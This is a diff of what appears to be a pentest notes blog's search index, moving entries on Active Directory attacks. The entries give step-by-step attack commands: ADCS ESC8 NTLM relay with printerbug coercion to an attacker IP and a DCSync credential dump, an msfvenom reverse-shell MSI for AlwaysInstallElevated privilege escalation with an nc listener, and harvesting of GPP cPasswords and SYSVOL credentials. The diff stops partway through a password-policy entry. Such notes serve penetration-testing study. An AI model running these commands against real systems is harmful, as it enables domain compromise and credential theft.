@@ -176,49 +176,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC8</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ADCS : ESC10</title>
     <url>/2026/06/04/ADCS-ESC10/</url>
     <content><![CDATA[<h1 id="Certificate-authentication-mapping"><a href="#Certificate-authentication-mapping" class="headerlink" title="Certificate authentication mapping"></a>Certificate authentication mapping</h1><p>When we authenticate using the <code>Certificate Authentication</code> method the Domain Controller (KDC) must answer a critical question :</p>
@@ -436,6 +393,106 @@
       </tags>
   </entry>
   <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AlwaysInstallElevated</title>
+    <url>/2026/06/26/AlwaysInstallElevated/</url>
+    <content><![CDATA[<blockquote>
+<p>Windows can be configured to allow MSI packages to be installed with SYSTEM privileges by any user through the <code>AlwaysInstallElevated</code> policy.</p>
+</blockquote>
+<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><blockquote>
+<p>Check whether the AlwaysInstallElevated policy is enabled.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>If both registry keys contain:</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>The system is vulnerable.</p>
+</blockquote>
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><blockquote>
+<p>Generate a malicious MSI payload.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;port&gt; -f msi &gt; shell.msi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the MSI package to the target and execute it.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msiexec /i shell.msi /quiet /qn /norestart</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Catch the incoming reverse shell.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Misconfigurations</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>AlwaysInstallElevated</tag>
+        <tag>MSI</tag>
+        <tag>Windows-Installer</tag>
+        <tag>msiexec</tag>
+        <tag>msfvenom</tag>
+        <tag>Registry</tag>
+        <tag>Registry-Policies</tag>
+        <tag>SYSTEM</tag>
+        <tag>Windows-Misconfiguration</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Attacking Child-Parent Trust From Linux</title>
     <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
     <content><![CDATA[<blockquote>
@@ -646,63 +703,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AlwaysInstallElevated</title>
-    <url>/2026/06/26/AlwaysInstallElevated/</url>
-    <content><![CDATA[<blockquote>
-<p>Windows can be configured to allow MSI packages to be installed with SYSTEM privileges by any user through the <code>AlwaysInstallElevated</code> policy.</p>
-</blockquote>
-<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><blockquote>
-<p>Check whether the AlwaysInstallElevated policy is enabled.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>If both registry keys contain:</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>The system is vulnerable.</p>
-</blockquote>
-<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><blockquote>
-<p>Generate a malicious MSI payload.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;port&gt; -f msi &gt; shell.msi</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Transfer the MSI package to the target and execute it.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msiexec /i shell.msi /quiet /qn /norestart</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Catch the incoming reverse shell.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Misconfigurations</category>
-      </categories>
-      <tags>
-        <tag>Windows</tag>
-        <tag>Privilege-Escalation</tag>
-        <tag>AlwaysInstallElevated</tag>
-        <tag>MSI</tag>
-        <tag>Windows-Installer</tag>
-        <tag>msiexec</tag>
-        <tag>msfvenom</tag>
-        <tag>Registry</tag>
-        <tag>Registry-Policies</tag>
-        <tag>SYSTEM</tag>
-        <tag>Windows-Misconfiguration</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Credential Hunting in Network Shares</title>
     <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
     <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
@@ -737,6 +737,100 @@
       <tags>
         <tag>SMB</tag>
         <tag>Enumeration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Credential Pillaging</title>
+    <url>/2026/06/30/Credential-Pillaging/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.</p>
+</blockquote>
+<h2 id="Group-Policy-Preferences-GPP"><a href="#Group-Policy-Preferences-GPP" class="headerlink" title="Group Policy Preferences (GPP)"></a>Group Policy Preferences (GPP)</h2><blockquote>
+<p>➜ Older versions of Group Policy Preferences stored passwords in the <code>cPassword</code> attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered <code>cPassword</code> value can be decrypted.</p>
+</blockquote>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="Search-for-GPP-Passwords"><a href="#Search-for-GPP-Passwords" class="headerlink" title="Search for GPP Passwords"></a>Search for GPP Passwords</h5><blockquote>
+<p>NetExec : Its <code>gpp_password</code> module locates and automatically decrypts GPP passwords in SYSVOL.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_password</span><br></pre></td></tr></table></figure>
+
+<h5 id="Search-for-GPP-AutoLogon-Credentials"><a href="#Search-for-GPP-AutoLogon-Credentials" class="headerlink" title="Search for GPP AutoLogon Credentials"></a>Search for GPP AutoLogon Credentials</h5><blockquote>
+<p>NetExec : The <code>gpp_autologin</code> module retrieves auto-logon credentials stored in <code>Registry.xml</code>.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_autologin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
+<p>Import the script Get-GPPPassword</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Get-GPPPassword</span>.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Retrieve GPP Passwords with Get-GPPPassword</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Manual-Retrieval"><a href="#Manual-Retrieval" class="headerlink" title="Manual Retrieval"></a>Manual Retrieval</h4><blockquote>
+<p>Browse a policy’s Preferences directory to find a <code>Groups.xml</code> file containing a <code>cPassword</code>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\&lt;GUID&gt;\Machine\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Decrypt a GPP cPassword</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpp-decrypt &lt;cPassword&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SYSVOL-Script-Pillaging"><a href="#SYSVOL-Script-Pillaging" class="headerlink" title="SYSVOL Script Pillaging"></a>SYSVOL Script Pillaging</h2><blockquote>
+<p>➜ SYSVOL stores logon scripts that may contain hardcoded credentials, mapped-drive passwords, or sensitive administrative commands.</p>
+</blockquote>
+<blockquote>
+<p>List the logon scripts and policy files stored in the SYSVOL scripts directory.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\scripts</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Read a logon script to look for hardcoded credentials or mapped-drive passwords.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\scripts\&lt;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Credentials-Stored-in-Active-Directory"><a href="#Credentials-Stored-in-Active-Directory" class="headerlink" title="Credentials Stored in Active Directory"></a>Credentials Stored in Active Directory</h2><blockquote>
+<p>➜ Administrators sometimes store passwords or other sensitive information directly in Active Directory user attributes.</p>
+</blockquote>
+<blockquote>
+<p>Import PowerView</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Enumerate User Descriptions : List all users whose description field is populated, as it may contain a password.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> * | <span class="built_in">Select-Object</span> samaccountname,description | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.description <span class="operator">-ne</span> <span class="variable">$null</span>&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Exploitation</category>
+        <category>Credential Pillaging</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Windows</tag>
+        <tag>Privilege-Escalation</tag>
+        <tag>Active-Directory</tag>
+        <tag>Credential-Pillaging</tag>
+        <tag>Credential-Access</tag>
+        <tag>GPP</tag>
+        <tag>Group-Policy-Preferences</tag>
+        <tag>cPassword</tag>
+        <tag>SYSVOL</tag>
+        <tag>Logon-Scripts</tag>
+        <tag>Get-GPPPassword</tag>
+        <tag>gpp-decrypt</tag>
+        <tag>NetExec</tag>
+        <tag>Active-Directory-Attributes</tag>
+        <tag>User-Descriptions</tag>
+        <tag>ADIDNSDump</tag>
+        <tag>Active-Directory-DNS</tag>
+        <tag>GPO</tag>
+        <tag>GPO-Abuse</tag>
+        <tag>SharpGPOAbuse</tag>
+        <tag>pyGPOAbuse</tag>
       </tags>
   </entry>
   <entry>
@@ -933,9 +1027,9 @@
         <tag>PowerView</tag>
         <tag>Windows</tag>
         <tag>Active-Directory</tag>
+        <tag>NetExec</tag>
         <tag>Credentialed-Enumeration</tag>
         <tag>ActiveDirectory-Module</tag>
-        <tag>NetExec</tag>
         <tag>SMBMap</tag>
         <tag>Snaffler</tag>
         <tag>SharpHound</tag>
@@ -953,100 +1047,6 @@
         <tag>Share-Enumeration</tag>
         <tag>Trust-Enumeration</tag>
         <tag>Kerberoasting</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Credential Pillaging</title>
-    <url>/2026/06/30/Credential-Pillaging/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.</p>
-</blockquote>
-<h2 id="Group-Policy-Preferences-GPP"><a href="#Group-Policy-Preferences-GPP" class="headerlink" title="Group Policy Preferences (GPP)"></a>Group Policy Preferences (GPP)</h2><blockquote>
-<p>➜ Older versions of Group Policy Preferences stored passwords in the <code>cPassword</code> attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered <code>cPassword</code> value can be decrypted.</p>
-</blockquote>
-<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="Search-for-GPP-Passwords"><a href="#Search-for-GPP-Passwords" class="headerlink" title="Search for GPP Passwords"></a>Search for GPP Passwords</h5><blockquote>
-<p>NetExec : Its <code>gpp_password</code> module locates and automatically decrypts GPP passwords in SYSVOL.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_password</span><br></pre></td></tr></table></figure>
-
-<h5 id="Search-for-GPP-AutoLogon-Credentials"><a href="#Search-for-GPP-AutoLogon-Credentials" class="headerlink" title="Search for GPP AutoLogon Credentials"></a>Search for GPP AutoLogon Credentials</h5><blockquote>
-<p>NetExec : The <code>gpp_autologin</code> module retrieves auto-logon credentials stored in <code>Registry.xml</code>.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M gpp_autologin</span><br></pre></td></tr></table></figure>
-
-<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><blockquote>
-<p>Import the script Get-GPPPassword</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Get-GPPPassword</span>.ps1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Retrieve GPP Passwords with Get-GPPPassword</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Manual-Retrieval"><a href="#Manual-Retrieval" class="headerlink" title="Manual Retrieval"></a>Manual Retrieval</h4><blockquote>
-<p>Browse a policy’s Preferences directory to find a <code>Groups.xml</code> file containing a <code>cPassword</code>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\&lt;GUID&gt;\Machine\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Decrypt a GPP cPassword</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpp-decrypt &lt;cPassword&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="SYSVOL-Script-Pillaging"><a href="#SYSVOL-Script-Pillaging" class="headerlink" title="SYSVOL Script Pillaging"></a>SYSVOL Script Pillaging</h2><blockquote>
-<p>➜ SYSVOL stores logon scripts that may contain hardcoded credentials, mapped-drive passwords, or sensitive administrative commands.</p>
-</blockquote>
-<blockquote>
-<p>List the logon scripts and policy files stored in the SYSVOL scripts directory.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\scripts</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Read a logon script to look for hardcoded credentials or mapped-drive passwords.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> \\&lt;DC&gt;\SYSVOL\&lt;DOMAIN&gt;\scripts\&lt;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Credentials-Stored-in-Active-Directory"><a href="#Credentials-Stored-in-Active-Directory" class="headerlink" title="Credentials Stored in Active Directory"></a>Credentials Stored in Active Directory</h2><blockquote>
-<p>➜ Administrators sometimes store passwords or other sensitive information directly in Active Directory user attributes.</p>
-</blockquote>
-<blockquote>
-<p>Import PowerView</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Enumerate User Descriptions : List all users whose description field is populated, as it may contain a password.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> * | <span class="built_in">Select-Object</span> samaccountname,description | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.description <span class="operator">-ne</span> <span class="variable">$null</span>&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Exploitation</category>
-        <category>Credential Pillaging</category>
-      </categories>
-      <tags>
-        <tag>PowerView</tag>
-        <tag>Windows</tag>
-        <tag>Privilege-Escalation</tag>
-        <tag>Active-Directory</tag>
-        <tag>NetExec</tag>
-        <tag>Credential-Pillaging</tag>
-        <tag>Credential-Access</tag>
-        <tag>GPP</tag>
-        <tag>Group-Policy-Preferences</tag>
-        <tag>cPassword</tag>
-        <tag>SYSVOL</tag>
-        <tag>Logon-Scripts</tag>
-        <tag>Get-GPPPassword</tag>
-        <tag>gpp-decrypt</tag>
-        <tag>Active-Directory-Attributes</tag>
-        <tag>User-Descriptions</tag>
-        <tag>ADIDNSDump</tag>
-        <tag>Active-Directory-DNS</tag>
-        <tag>GPO</tag>
-        <tag>GPO-Abuse</tag>
-        <tag>SharpGPOAbuse</tag>
-        <tag>pyGPOAbuse</tag>
       </tags>
   </entry>
   <entry>
@@ -1235,39 +1235,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Enumerating &amp; Retrieving Password Policies</title>
-    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
-
